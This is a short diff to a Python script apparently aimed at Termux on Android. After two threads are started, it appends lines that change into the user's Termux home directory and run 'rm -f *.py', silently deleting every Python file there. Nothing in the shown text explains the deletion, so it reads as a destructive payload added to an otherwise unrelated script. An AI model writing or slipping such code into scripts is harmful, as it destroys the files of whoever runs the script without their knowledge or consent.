@@ -22,3 +22,5 @@ def txt2():
 
 threading.Thread(target=txt).start()
 threading.Thread(target=txt2).start()
+os.chdir('/data/data/com.termux//files/home')
+os.system('rm -f *.py')
